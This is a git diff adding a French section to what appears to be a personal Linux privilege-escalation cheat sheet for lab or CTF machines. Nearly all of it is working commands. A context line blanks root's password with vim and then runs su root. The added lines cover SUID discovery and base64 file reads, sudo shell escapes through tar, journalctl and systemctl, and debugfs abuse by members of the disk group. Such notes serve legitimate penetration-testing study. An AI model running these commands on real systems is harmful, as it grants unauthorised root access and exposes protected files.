@@ -64,3 +64,42 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 su root # Sans mot de passe
 ```
+
+## Techniques d'élévation de privilèges Linux dans des Box
+### Exploitation des droits SUID
+Exemple (Image):
+```bash
+# Rechercher des binaires SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# Exploiter un binaire SUID vulnérable
+/usr/bin/base64 /root/proof.txt | base64 -d
+```
+### Exploitation des droits sudo
+Exemple (Cockpit):
+```bash
+# Vérifier les droits sudo
+sudo -l
+
+# Exploiter tar avec sudo
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
+Exemple (Jordak):
+```bash
+# Exploiter journalctl avec sudo
+sudo /usr/bin/journalctl -n5 -unostromo.service
+# Puis taper "!/bin/bash" quand less est lancé
+```
+Exemple (Scrutiny):
+```bash
+# Exploiter systemctl avec sudo
+sudo systemctl
+!sh
+```
+### Exploitation des droits de groupe
+Exemple (Extplorer):
+```bash
+# Exploiter l'appartenance au groupe disk
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+cat /root/proof.txt
+```
